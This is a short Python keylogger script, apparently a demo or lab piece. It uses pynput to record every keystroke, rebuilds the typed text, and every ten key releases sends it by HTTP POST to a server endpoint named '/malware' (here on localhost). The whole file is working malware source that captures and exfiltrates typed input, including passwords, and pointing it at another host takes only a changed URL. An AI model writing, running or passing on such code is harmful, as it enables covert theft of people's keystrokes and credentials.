from pynput.keyboard import Key, Listener
from requests import post

count = 0
keys = []

def on_press(key):
    print('{0} pressed'.format(key))

def send_to_server(keys):
    user_input = ''
    space_key = Key.space
    for key in keys:
        if key == space_key:
            user_input += ' '
        else:    
            k = str(key).replace("'", "")
            if k.find("Key") == -1:
                user_input += k
    data = {
        'text': user_input
    }
    print('sending post request to server')
    r = post('http://127.0.0.1:5000/malware', data=data)
    print(r.text)


def on_release(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 10:
        count = 0
        send_to_server(keys)
        keys = []
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()